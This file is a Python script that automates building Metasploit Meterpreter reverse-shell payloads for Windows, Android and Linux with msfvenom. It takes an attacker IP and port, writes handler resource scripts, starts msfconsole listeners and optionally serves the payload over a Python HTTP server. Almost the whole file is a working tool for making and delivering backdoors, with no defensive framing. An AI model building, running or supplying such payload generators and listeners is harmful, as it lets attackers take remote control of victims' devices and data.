import os

from sys import stdout

def red():
    RED = "\033[1;31m"
    stdout.write(RED)

def green():
    GREEN = "\033[0;32m"
    stdout.write(GREEN)

def blue():
    BLUE = "\033[1;34m"
    stdout.write(BLUE)

def yellow():
    YELLOW = "\033[1;33m"
    stdout.write(YELLOW)

def purple():
    PURPLE = "\033[1;35m"
    stdout.write(PURPLE)

def white():
    WHITE = "\033[1;37m"
    stdout.write(WHITE)


def main():
	green()
	ip = input("[*] Atacker Ip -->> ")
	print("")
	port = input("[*] Listener Port -->> ")
	print("")
	payload = input("[*] Payload: android/linux/windows -->> ")
	print("")
	name = input("[*] File Name without .exe/.elf... -->> ")
	print("")
	yellow()
	print("[+] Ip       -->> "+ip+"")
	print("[+] Port     -->> "+port+"")
	print("[+] Payload  -->> "+payload+"")
	print("[+] FileName -->> "+name+"")

	if payload == "windows":
		red()
		print("")
		print("[+] Creating payload ...")
		blue()
		os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST="+ip+" LPORT="+port+" -f exe >> "+name+".exe 2>/dev/null")
		print("")
		print("[+] Payload saved on "+name+".exe")

		green()
		listen = input("\n[X] Do you want to start the listener? y/n -->> ")

		if listen == "y":
			os.system("rm windows.rb 2>/dev/null")
			os.system("echo 'use exploit/multi/handler' >> windows.rb")
			os.system("echo 'set LHOST "+ip+"' >> windows.rb")
			os.system("echo 'set LPORT "+port+"' >> windows.rb")
			os.system("echo 'set PAYLOAD windows/meterpreter/reverse_tcp' >> windows.rb")
			os.system("echo 'exploit' >> windows.rb")
			os.system("gnome-terminal -- msfconsole -r windows.rb &")

			red()
			http = input("[X] Do you want to create a http server with python3? y/n -->> ")

			if http == "y":
				purple()
				httpPort = input("\n[X] Http port -->> ")
				os.system("gnome-terminal -- python3 -m http.server "+httpPort+" ")

	if payload == "android":
		red()
		print("")
		print("[+] Creating payload ...")
		os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST="+ip+" LPORT="+port+" AndroidMeterpreterDebug=true AndroidWakelock=true  -o  "+name+".apk 2>/dev/null")
		blue()
		print("")
		print("[+] Saved on "+name+".apk")

		green()
		listen = input("\n[X] Do you want to start the listener? y/n -->> ")

		if listen == "y":
			os.system("rm android.rb 2>/dev/null")
			os.system("echo 'use exploit/multi/handler' >> android.rb")
			os.system("echo 'set LHOST "+ip+"' >> android.rb")
			os.system("echo 'set LPORT "+port+"' >> android.rb")
			os.system("echo 'set PAYLOAD android/meterpreter/reverse_tcp' >> android.rb")
			os.system("echo 'run' >> android.rb")
			os.system("gnome-terminal -- msfconsole -r android.rb &")

			red()
			http = input("[X] Do you want to create a http server with python3? y/n -->> ")

			if http == "y":
				purple()
				httpPort = input("\n[X] Http port -->> ")
				os.system("gnome-terminal -- python3 -m http.server "+httpPort+" ")

	if payload == "linux":
		red()
		print("")
		print("[+] Creating payload ...")
		os.system("msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="+ip+" LPORT="+port+" -f elf >> "+name+".elf 2>/dev/null")
		blue()
		print("")
		print("[+] Saved on "+name+".apk")

		green()
		listen = input("\n[X] Do you want to start the listener? y/n -->> ")
		
		if listen == "y":
			os.system("rm linux.rb 2>/dev/null")
			os.system("echo 'use exploit/multi/handler' >> linux.rb")
			os.system("echo 'set LHOST "+ip+"' >> linux.rb")
			os.system("echo 'set LPORT "+port+"' >> linux.rb")
			os.system("echo 'set PAYLOAD linux/x86/meterpreter/reverse_tcp' >> linux.rb")
			os.system("echo 'run' >> linux.rb")
			os.system("gnome-terminal -- msfconsole -r linux.rb &")

			red()
			http = input("[X] Do you want to create a http server with python3? y/n -->> ")

			if http == "y":
				purple()
				httpPort = input("\n[X] Http port -->> ")
				os.system("gnome-terminal -- python3 -m http.server "+httpPort+" ")

if __name__ == '__main__':
	main()
